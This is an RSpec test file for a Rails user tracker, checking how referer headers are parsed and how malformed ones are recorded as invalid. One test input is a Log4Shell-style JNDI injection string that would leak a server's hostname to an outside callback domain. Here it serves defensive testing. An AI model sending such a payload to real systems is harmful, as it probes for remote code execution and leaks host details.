# frozen_string_literal: true

require 'rails_helper'

module Land
  module Trackers
    describe UserTracker do
      let(:request) { ActionDispatch::TestRequest.create }
      let(:response) { ActionDispatch::Response.create }
      let(:controller) { double('controller', request: request, response: response, session: {}) }

      subject(:user_tracker) { described_class.new(controller) }

      describe '#track' do
        context 'when referer header is passed in' do
          {
            'http://m.facebook.com' => {
              domain: 'm.facebook.com',
              path: '/',
              query_string: ''
            },
            '172.64.147.80:443/module/login/login.html' => {
              domain: '',
              path: '/invalid-referer-uri',
              query_string: 'referer=172.64.147.80%3A443%2Fmodule%2Flogin%2Flogin.html'
            },
            '${jndi:ldap://127.0.0.1#.${hostName}.referer.co6ie8vkjvuu6bgp6c5gmkjktaa6yu8jy.it.h4.vc}' => {
              domain: '',
              path: '/invalid-referer-uri',
              query_string: 'referer=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%23.%24%7BhostName%7D.referer.co6ie8vkjvuu6bgp6c5gmkjktaa6yu8jy.it.h4.vc%7D'
            },
            'www.example.com/@F#$#D!^&*~^%DS%F&DF^&*D*F&^D' => {
              domain: '',
              path: '/invalid-referer-uri',
              query_string: 'referer=www.example.com%2F%40F%23%24%23D%21%5E%26%2A~%5E%25DS%25F%26DF%5E%26%2AD%2AF%26%5ED'
            }
          }.each do |referer, result|
            it "saves referer (#{referer})" do
              request.headers['referer'] = referer
              user_tracker.track

              expect(user_tracker.visit.referer).to have_attributes(result)
            end
          end
        end

        it "referer is nil when no referer header" do
          user_tracker.track

          expect(user_tracker.visit.referer).to be_nil
        end

        it "referer is nil when referer header is empty string" do
          request.headers['referer'] = ''
          user_tracker.track

          expect(user_tracker.visit.referer).to be_nil
        end
      end
    end
  end
end
